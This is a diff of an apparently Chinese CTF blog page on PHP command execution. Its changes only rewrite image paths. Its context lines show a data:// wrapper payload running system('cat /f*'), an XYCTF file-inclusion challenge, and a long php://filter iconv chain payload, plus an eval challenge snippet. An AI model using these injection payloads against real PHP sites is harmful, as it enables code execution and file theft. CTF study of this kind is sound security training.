@@ -16,14 +16,14 @@
 <meta property="og:site_name" content="Zbaoabo">
 <meta property="og:description" content="[TOC] 一、命令执行函数CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户 CTF命令执行常用绕过方式_ctf 命令执行 空格绕过-CSDN博客 12345678system 函数：system 函数执行系统命令，并将输出直接打印到标准输出。它的返回值是命令的最后一行输出或者返回状态码（命令成功执行返回0）。shell_exec 函数：shell_exec 函数执行系统命令，但">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
-<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png">
-<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png">
+<meta property="og:image" content="http://example.com/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
+<meta property="og:image" content="http://example.com/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png">
+<meta property="og:image" content="http://example.com/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png">
 <meta property="article:published_time" content="2025-03-14T12:02:38.067Z">
 <meta property="article:modified_time" content="2025-09-13T09:06:56.357Z">
 <meta property="article:author" content="zhangsuhong">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
+<meta name="twitter:image" content="http://example.com/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
   
     <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
   
@@ -302,7 +302,7 @@
 
 <h3 id="3-data-伪协议"><a href="#3-data-伪协议" class="headerlink" title="3.data:&#x2F;&#x2F;伪协议"></a>3.data:&#x2F;&#x2F;伪协议</h3><p>需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用</p>
 <p><strong>eg：</strong></p>
-<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png" alt="image-20250913170647274"></p>
+<p><img src="/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png" alt="image-20250913170647274"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2YqIik7</span><br><span class="line">?c=data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
 
 
@@ -312,14 +312,14 @@
 <h2 id="六、LFI（本地文件目录）"><a href="#六、LFI（本地文件目录）" class="headerlink" title="六、LFI（本地文件目录）"></a>六、LFI（本地文件目录）</h2><h4 id="XYCTF-连连看到底是连连什么看"><a href="#XYCTF-连连看到底是连连什么看" class="headerlink" title="XYCTF 连连看到底是连连什么看"></a>XYCTF 连连看到底是连连什么看</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$p=$_GET[&#x27;p&#x27;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/http|=|php|file|:|\/|\?/i&quot;, $p))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;waf!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=&quot;php://filter/$p/resource=/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">if(file_get_contents($payload)===&quot;XYCTF&quot;)&#123;</span><br><span class="line">    echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>代码审计 鉴定为php_filter_chian</p>
-<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png" alt="屏幕截图 2025-04-24 200443"></p>
+<p><img src="/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png" alt="屏幕截图 2025-04-24 200443"></p>
 <p>直接打的话XYCTF后会有脏数据</p>
 <p>手动加||string.strip_tags过滤器来去除php标签</p>
 <p>构造XYCTF&lt;?php</p>
 <p>最终payload为:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png" alt="image-20250424200546514"></p>
+<p><img src="/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png" alt="image-20250424200546514"></p>
 <h2 id="七、eg"><a href="#七、eg" class="headerlink" title="七、eg"></a>七、eg</h2><h3 id="1-什么符号都没有过滤"><a href="#1-什么符号都没有过滤" class="headerlink" title="1.什么符号都没有过滤"></a>1.什么符号都没有过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$a))&#123;  die(&quot;no!&quot;);&#125;@eval($a);?&gt; </span><br></pre></td></tr></table></figure>
 
 <p>采用取反、自增、异或等方法</p>
